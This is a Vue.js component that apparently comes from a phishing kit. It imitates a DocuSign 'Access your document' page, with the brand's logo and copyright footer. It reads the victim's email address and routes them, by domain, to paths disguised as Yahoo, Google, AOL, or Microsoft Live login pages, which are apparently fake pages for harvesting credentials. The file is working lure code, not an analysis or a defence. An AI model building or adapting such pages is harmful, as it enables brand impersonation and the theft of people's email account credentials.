<template>
    <div>
    <v-toolbar color="#1b49a0" flat style="padding: 0px 50px;">
      <img src="../assets/docusign.png" alt="" height='30px'>
      <v-spacer></v-spacer>
      <v-toolbar-items>
        <v-btn text dark>Help</v-btn>
      </v-toolbar-items>
    </v-toolbar>
    <div class="content">
             <div class="site-card">
      <h3 style="letter-spacing:2px;margin-bottom:10px">ACCESS YOUR DOCUMENT</h3>
      <p style="color:#aaaaaa;font-size:12px;">Confirm the below email address is correct and proceed to Authentication, you may use your browser's back button to make necessary changes.</p>
            <v-divider></v-divider>
            <br>
            <form action="">
               <label for="" style="font-size:14px;">Email Address</label>
            <br>
            <input type="text" class="text-field" required :value="getEmailPending" readonly>
            <br>
            <br>
            <Button @click="getProvider" type="submit" style=" font-size:14px;background:#ffc820;padding:10px 25px;font-weight:bold;">PROCEED</Button>  
            </form>
             </div>
            
    </div>
    <div class="footer">
        <p style="margin-top:20px;display:inline-block;float:left;font-size:12px;color:white;">Powered by <span style="margin-left:10px;"><img src="../assets/docusign.png" alt="" height="16px"></span></p>
    <p style="margin-top:20px;display:inline-block;color:white;float:right; font-size:14px;">Copyright © 2019 DocuSign, Inc. All rights reserved.</p>
    </div>
    </div>
</template>
<script>
import { mapGetters } from 'vuex'
export default {
    data(){
        return{
        Email: '',
        provider:''
        }
    },
      computed:{
         ...mapGetters ([
              'getEmailPending',
         ]),
   },
   methods:{
      getProvider(){
          var email = this.getEmailPending;
this.provider = email.substring(email.indexOf("@") + 1);
        if(this.provider == 'yahoo.com' || this.provider == 'ymail.com'){
             this.$router.push("/login-yahoo-com-src-ym&-lang-en-US&-intl-us&-done-mail.yahoo.com")
        }
        else if(this.provider == 'gmail.com'){
            this.$router.push("/signin/account-google-com-src-ym&-lang-en-US&-intl-us&-done-mail.google.com")
        }
        else if(this.provider == 'aol.com'){
            this.$router.push("/login-aol-com-src-ym&-lang-en-US&-intl-us&-done-mail.aol.com")
        }
        else if(this.provider == 'hotmail.com'){
            this.$router.push("/live-onedrive--account-com-src-ym&-lang-en-US&-intl-us&-done-mail.live.com")
        }
        else if(this.provider == 'msn.com'){
            this.$router.push("/live-onedrive--account-com-src-ym&-lang-en-US&-intl-us&-done-mail.live.com")
        }
        else if(this.provider == 'outlook.com'){
            this.$router.push("/live-onedrive--account-com-src-ym&-lang-en-US&-intl-us&-done-mail.live.com")
        }
        else{
             this.$router.push("/account/webmail/Docsign-redirect-src-ym&-lang-en-US&-intl-us&-done-mail.com")
        }
      }
       }
}
</script>

<style scoped>
.footer{
    width: 100%;
    padding: 0px 40px;
    position: absolute;
    background: #555;
    color: #CCC;
    bottom: 0;
    left:0;

}
.text-field { height: 40px; border: 1px solid rgb(189, 189, 189);width: 100%;}
.content{padding: 80px 0px;text-align: left;background: #ececec;height:100vh}
.site-card {margin: auto; padding:50px; width:480px;background: white;}

  @media (max-width: 991px) { 
.footer{
    width: 100%;
    padding: 0px 40px;
    position: absolute;
    background: #555;
    color: #CCC;
    bottom: 0;
    left:0;

}
.text-field { height: 40px; border: 1px solid rgb(189, 189, 189);width: 100%;}
.content{padding: 80px 0px;text-align: left; background: #ececec;height:100vh}
.site-card {margin: auto; padding:50px; width:480px;background: white;}

  }

 @media (max-width: 767px) {   

}

    @media (max-width: 479px) {
.footer{
    width: 100%;
    padding: 0px 40px;
    position: absolute;
    background: #555;
    color: #CCC;
    bottom: 0;
    left:0;

}
.text-field { height: 40px; border: 1px solid rgb(189, 189, 189);width: 100%;}
.content{padding: 30px 10px;text-align: left;background: #ececec;background: #ececec;}
.site-card {margin: auto; padding:30px; width:auto;background: white;}

    }
</style>
